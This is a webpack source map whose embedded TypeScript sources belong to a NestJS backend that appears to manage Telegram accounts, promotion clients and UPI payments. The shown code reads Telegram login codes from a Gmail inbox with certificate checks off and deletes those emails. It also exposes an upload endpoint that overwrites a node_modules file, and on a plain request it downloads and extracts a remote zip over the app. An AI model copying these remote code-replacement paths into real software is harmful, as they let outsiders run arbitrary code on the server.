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","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/app.service.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/dto/addContact.dto.ts",".././src/components/Telegram/dto/addContacts.dto.ts",".././src/components/TgSignup/TgSignup.module.ts",".././src/components/TgSignup/TgSignup.service.ts",".././src/components/TgSignup/tgSignup.controller.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/add-reaction.dto.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/archived-clients/archived-client.controller.ts",".././src/components/archived-clients/archived-client.module.ts",".././src/components/archived-clients/archived-client.service.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/search-buffer- client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/utils.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"imap\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../webpack/bootstrap","../webpack/before-startup","../webpack/startup","../webpack/after-startup"],"sourcesContent":["import Imap from 'imap';\r\nimport { fetchNumbersFromString, parseError, sleep } from '../utils';\r\n\r\nexport class MailReader {\r\n    private static instance: MailReader;\r\n    private imap: Imap;\r\n    private isReady: boolean = false;\r\n    private result: string = '';\r\n\r\n    private constructor() {\r\n        this.imap = new Imap({\r\n            user: process.env.GMAIL_ADD,\r\n            password: process.env.GMAIL_PASS,\r\n            host: 'imap.gmail.com',\r\n            port: 993,\r\n            tls: true,\r\n            tlsOptions: {\r\n                rejectUnauthorized: false,\r\n            },\r\n        });\r\n\r\n        this.imap.on('ready', () => {\r\n            console.log('Mail is Ready');\r\n            this.isReady = true;\r\n        });\r\n\r\n        this.imap.on('error', (err) => {\r\n            console.error('SomeError:', err);\r\n            this.isReady = false;\r\n        });\r\n\r\n        this.imap.on('end', () => {\r\n            console.log('Connection ended');\r\n            this.isReady = false;\r\n        });\r\n    }\r\n\r\n    public static getInstance(): MailReader {\r\n        if (!MailReader.instance) {\r\n            MailReader.instance = new MailReader();\r\n        }\r\n        return MailReader.instance;\r\n    }\r\n\r\n    public async connectToMail(): Promise<void> {\r\n        console.log('Connecting to mail server');\r\n        try {\r\n            this.imap.connect();\r\n            this.isReady = true;\r\n            console.log('Connected to mail server');\r\n        } catch (err) {\r\n            console.error('Error connecting to mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async disconnectFromMail(): Promise<void> {\r\n        console.log('Disconnecting from mail server');\r\n        try {\r\n            this.imap.end();\r\n            this.isReady = false;\r\n            console.log('Disconnected from mail server');\r\n        } catch (err) {\r\n            console.error('Error disconnecting from mail server:', parseError(err));\r\n            throw err;\r\n        }\r\n    }\r\n\r\n    public async isMailReady(): Promise<boolean> {\r\n        return this.isReady;\r\n    }\r\n\r\n    public async getCode(): Promise<string> {\r\n        console.log(\"MailReady : \", this.isReady)\r\n        if (!this.isReady) {\r\n            console.log(\"Re-Connecting mail server\");\r\n            await this.connectToMail();\r\n            await sleep(10000);\r\n        }\r\n\r\n        try {\r\n            await this.openInbox();\r\n\r\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\r\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\r\n            console.log('Inbox Opened');\r\n\r\n            const results = await new Promise<any[]>((resolve, reject) => {\r\n                this.imap.search(searchCriteria, (err, results) => {\r\n                    if (err) {\r\n                        console.error('Search error:', parseError(err));\r\n                        reject(err);\r\n                    } else {\r\n                        resolve(results);\r\n                    }\r\n                });\r\n            });\r\n\r\n            if (results.length > 0) {\r\n                console.log('Emails found:', results.length);\r\n                const length = results.length;\r\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\r\n\r\n                await new Promise<void>((resolve, reject) => {\r\n                    fetch.on('message', (msg, seqno) => {\r\n                        const emailData: string[] = [];\r\n\r\n                        msg.on('body', (stream, info) => {\r\n                            let buffer = '';\r\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\r\n                            stream.on('end', () => {\r\n                                if (info.which === 'TEXT') {\r\n                                    emailData.push(buffer);\r\n                                }\r\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\r\n                                    if (err) reject(err);\r\n                                    this.imap.expunge((err) => {\r\n                                        if (err) reject(err);\r\n                                        console.log('Deleted message');\r\n                                    });\r\n                                });\r\n                            });\r\n                        });\r\n\r\n                        msg.once('end', () => {\r\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\r\n                            console.log('EmailDataLength:', emailData.length);\r\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\r\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\r\n                            resolve();\r\n                        });\r\n                    });\r\n\r\n                    fetch.once('end', () => {\r\n                        console.log('Fetched mails');\r\n                        resolve();\r\n                    });\r\n                });\r\n            } else {\r\n                console.log('No new emails found');\r\n            }\r\n\r\n            console.log('Returning result:', this.result);\r\n            return this.result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            this.isReady = false;\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    private async openInbox(): Promise<void> {\r\n        await new Promise<void>((resolve, reject) => {\r\n            this.imap.openBox('INBOX', false, (err) => {\r\n                if (err) {\r\n                    console.error('Open Inbox error:', parseError(err));\r\n                    reject(err);\r\n                } else {\r\n                    console.log('Inbox opened');\r\n                    resolve();\r\n                }\r\n            });\r\n        });\r\n    }\r\n}","import { Controller, Get, Param, Post, Query, UploadedFile, UploadedFiles, UseInterceptors } from '@nestjs/common';\r\nimport { AppService } from './app.service';\r\nimport { FileInterceptor, FilesInterceptor } from '@nestjs/platform-express';\r\nimport { ApiOperation, ApiParam, ApiQuery, ApiConsumes, ApiBody } from '@nestjs/swagger';\r\nimport { existsSync, mkdirSync, promises as fs } from 'fs';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\nimport { join } from 'path';\r\nimport { CloudinaryService } from './cloudinary';\r\n\r\n@Controller()\r\nexport class AppController {\r\n    constructor(private readonly appService: AppService) {}\r\n\r\n    @Get()\r\n    getHello(): string {\r\n        CloudinaryService.getInstance(\"kavya\")\r\n        return this.appService.getHello();\r\n    }\r\n\r\n    @Post('updateCommonService')\r\n    @UseInterceptors(\r\n        FileInterceptor('file', {\r\n            storage: diskStorage({\r\n                destination: (req, file, cb) => {\r\n                    try {\r\n                        const folderPath = join(__dirname, '..', 'uploads');\r\n                        if (!existsSync(folderPath)) {\r\n                            mkdirSync(folderPath, { recursive: true });\r\n                        }\r\n                        cb(null, folderPath);\r\n                    } catch (error) {\r\n                        cb(error, null);\r\n                    }\r\n                },\r\n                filename: (req, file, cb) => {\r\n                    cb(null, 'index.js');\r\n                },\r\n            }),\r\n        }),\r\n    )\r\n    @ApiOperation({ summary: 'Upload a file to update commonService index.js' })\r\n    @ApiConsumes('multipart/form-data')\r\n    @ApiBody({\r\n        schema: {\r\n            type: 'object',\r\n            properties: {\r\n                file: { type: 'string', format: 'binary' },\r\n            },\r\n        },\r\n    })\r\n    async uploadFileAndUpdate(@UploadedFile() file: MulterFile): Promise<{ message: string }> {\r\n        try {\r\n            const targetDir = join(__dirname, '..', 'node_modules', 'commonService');\r\n            const filePath = join(targetDir, 'index.js');\r\n\r\n            // Ensure the target directory exists\r\n            if (!existsSync(targetDir)) {\r\n                mkdirSync(targetDir, { recursive: true });\r\n            }\r\n\r\n            // Read the uploaded file\r\n            const fileBuffer = await fs.readFile(file.path);\r\n\r\n            // Write to the target location\r\n            await fs.writeFile(filePath, fileBuffer);\r\n\r\n            console.log('commonService/index.js updated successfully.');\r\n            return { message: 'commonService/index.js updated successfully' };\r\n        } catch (error) {\r\n            console.error('Failed to update commonService/index.js:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\r\nimport { UsersModule } from './components/users/users.module';\r\nimport { UserDataModule } from './components/user-data/user-data.module';\r\nimport { ClientModule } from './components/clients/client.module';\r\nimport { TelegramModule } from './components/Telegram/Telegram.module';\r\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\r\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\r\nimport { ArchivedClientModule } from './components/archived-clients/archived-client.module';\r\nimport { initModule } from './components/ConfigurationInit/init.module';\r\nimport { ChannelsModule } from './components/channels/channels.module';\r\nimport { AppController } from './app.controller';\r\nimport { AppService } from './app.service';\r\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\r\nimport { BuildModule } from './components/builds/build.module';\r\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\r\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\r\nimport { StatModule } from './components/stats/stat.module';\r\nimport { Stat2Module } from './components/stats2/stat2.module';\r\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\r\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\r\nimport { TgSignupModule } from './components/TgSignup/TgSignup.module';\r\nimport { TransactionModule } from './components/transactions/transaction.module';\r\nimport { NpointModule } from './components/n-point/npoint.module';\r\n\r\n@Module({\r\n  imports: [\r\n    initModule,\r\n    TelegramModule,\r\n    ActiveChannelsModule,\r\n    ClientModule,\r\n    UserDataModule,\r\n    UsersModule,\r\n    BufferClientModule,\r\n    ArchivedClientModule,\r\n    ChannelsModule,\r\n    PromoteClientModule,\r\n    BuildModule,\r\n    UpiIdModule,\r\n    PromoteMsgModule,\r\n    PromoteStatModule,\r\n    StatModule,\r\n    Stat2Module,\r\n    TgSignupModule,\r\n    TransactionModule,\r\n    NpointModule,\r\n  ],\r\n  controllers:[AppController],\r\n  providers:[AppService],\r\n  exports:[\r\n    TelegramModule,\r\n    ActiveChannelsModule,\r\n    ClientModule,\r\n    UserDataModule,\r\n    UsersModule,\r\n    BufferClientModule,\r\n    ArchivedClientModule,\r\n    ChannelsModule,\r\n    PromoteClientModule,\r\n    TgSignupModule,\r\n    TransactionModule\r\n  ]\r\n})\r\nexport class AppModule implements NestModule {\r\n  configure(consumer: MiddlewareConsumer) {\r\n    consumer.apply(LoggerMiddleware).forRoutes('*');\r\n  }\r\n}","import { Injectable } from '@nestjs/common';\r\nimport { promises as fs } from 'fs';\r\nimport { join } from 'path';\r\nimport { diskStorage, File as MulterFile } from 'multer';\r\n\r\n@Injectable()\r\nexport class AppService {\r\n  getHello(): string {\r\n    return 'Hello World!';\r\n  }\r\n}\r\n","console.log(\"in Cloudinary\");\r\nimport * as cloudinary from 'cloudinary';\r\nimport * as path from 'path';\r\nimport * as fs from 'fs';\r\nimport { fetchWithTimeout, parseError } from './utils';\r\nimport AdmZip from 'adm-zip';\r\n\r\nexport class CloudinaryService {\r\n    static instance;\r\n    resources = new Map();\r\n\r\n    constructor() {\r\n        cloudinary.v2.config({\r\n            cloud_name: process.env.CL_NAME,\r\n            api_key: process.env.CL_APIKEY,\r\n            api_secret: process.env.CL_APISECRET\r\n        });\r\n    }\r\n\r\n    static async getInstance(name) {\r\n        if (!CloudinaryService.instance) {\r\n            CloudinaryService.instance = new CloudinaryService();\r\n        }\r\n        await CloudinaryService.instance.getResourcesFromFolder(name);\r\n        return CloudinaryService.instance;\r\n    }\r\n\r\n    public async downloadAndExtractZip(url: string) {\r\n        const zipPath = path.resolve(__dirname, 'temp.zip');\r\n        const extractPath = path.resolve(__dirname, '../');\r\n    \r\n        // Download the zip file\r\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\r\n        if (response?.status === 200) {\r\n          fs.writeFileSync(zipPath, response.data);\r\n          console.log('Zip file downloaded successfully.');\r\n          // Extract the zip file using adm-zip\r\n          const zip = new AdmZip(zipPath);\r\n          zip.extractAllTo(extractPath, true);\r\n          console.log('Zip file extracted successfully.');\r\n          fs.unlinkSync(zipPath); // Remove the zip file after extraction\r\n        } else {\r\n          throw new Error(`Unable to download zip file from ${url}`);\r\n        }\r\n      }\r\n\r\n    async getResourcesFromFolder(folderName) {\r\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\r\n        await this.downloadAndExtractZip(`https://promoteClients2.glitch.me/folders/${folderName}/files/download-all`);\r\n        // await this.findAndSaveResources(folderName, 'image');\r\n    }\r\n\r\n    async createNewFolder(folderName) {\r\n        await this.createFolder(folderName);\r\n        await this.uploadFilesToFolder(folderName);\r\n    }\r\n\r\n    async overwriteFile() {\r\n        const cloudinaryFileId = \"index_nbzca5.js\";\r\n        const localFilePath = \"./src/test.js\";\r\n\r\n        try {\r\n\r\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\r\n                resource_type: 'auto',\r\n                overwrite: true,\r\n                invalidate: true,\r\n                public_id: cloudinaryFileId\r\n            });\r\n            console.log(result);\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n\r\n    }\r\n\r\n    async findAndSaveResources(folderName: string, type: string): Promise<void> {\r\n        try {\r\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\r\n            await Promise.all(resources.map(async (resource) => {\r\n                try {\r\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\r\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\r\n                } catch (error) {\r\n                    console.log(resource);\r\n                    parseError(error)\r\n                }\r\n            }));\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    async createFolder(folderName) {\r\n        try {\r\n            const result = await cloudinary.v2.api.create_folder(folderName);\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error creating folder:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    // Function to upload files from URLs to a specific folder in Cloudinary\r\n    async uploadFilesToFolder(folderName) {\r\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\r\n            try {\r\n                const result = await cloudinary.v2.uploader.upload_large(url, {\r\n                    folder: folderName,\r\n                    resource_type: 'auto',\r\n                    public_id: key, // Set the key as the public_id\r\n                });\r\n\r\n                return result;\r\n            } catch (error) {\r\n                console.error('Error uploading file:', error);\r\n                throw error;\r\n            }\r\n        });\r\n\r\n        try {\r\n            return await Promise.all(uploadPromises);\r\n        } catch (error) {\r\n            console.error('Error uploading files:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async printResources() {\r\n        try {\r\n            this.resources?.forEach((val, key) => {\r\n                console.log(key, \":\", val);\r\n            })\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    get(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            parseError(error)\r\n        }\r\n    }\r\n\r\n    getBuffer(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n}\r\n\r\nasync function saveFile(url: string, name: string) {\r\n    try {\r\n        const extension = url.substring(url.lastIndexOf('.') + 1);\r\n        const rootPath = process.cwd();\r\n        const mypath = path.join(rootPath, `${name}.${extension}`);\r\n        console.log(mypath);\r\n\r\n        const res = await fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2);\r\n\r\n        if (res?.statusText === 'OK') {\r\n            if (!fs.existsSync(mypath)) {\r\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                console.log(`${name}.${extension} Saved!!`);\r\n            } else {\r\n                fs.unlinkSync(mypath);\r\n                fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                console.log(`${name}.${extension} Replaced!!`);\r\n            }\r\n        } else {\r\n            throw new Error(`Unable to download file from ${url}`);\r\n        }\r\n    } catch (err) {\r\n        parseError(err);\r\n    }\r\n}\r\n\r\n\r\n","import { Schema, SchemaFactory } from '@nestjs/mongoose';\r\nimport mongoose, { Document } from 'mongoose';\r\n\r\nexport type ConfigurationDocument = Configuration & Document;\r\n\r\n@Schema({\r\n    versionKey: false, autoIndex: true, strict: false, timestamps: true,\r\n    toJSON: {\r\n        virtuals: true,\r\n        transform: (doc, ret) => {\r\n            delete ret._id;\r\n        },\r\n    },\r\n})\r\nexport class Configuration { }\r\n\r\nexport const ConfigurationSchema = SchemaFactory.createForClass(Configuration);\r\nConfigurationSchema.add({ type: mongoose.Schema.Types.Mixed });\r\n\r\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\r\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\r\nimport { ConfigurationService } from './init.service';\r\n\r\n@ApiTags('Configuration')\r\n@Controller('configuration')\r\nexport class ConfigurationController {\r\n  constructor(private readonly configurationService: ConfigurationService) {}\r\n\r\n  @Get()\r\n  @ApiOperation({ summary: 'Get configuration data' })\r\n  async findOne(): Promise<any>{\r\n    return this.configurationService.findOne();\r\n  }\r\n\r\n  @Patch()\r\n  @ApiOperation({ summary: 'Update configuration' })\r\n  @ApiBody({type: Object})\r\n  async update( @Body() updateClientDto: any): Promise<any> {\r\n    return this.configurationService.update( 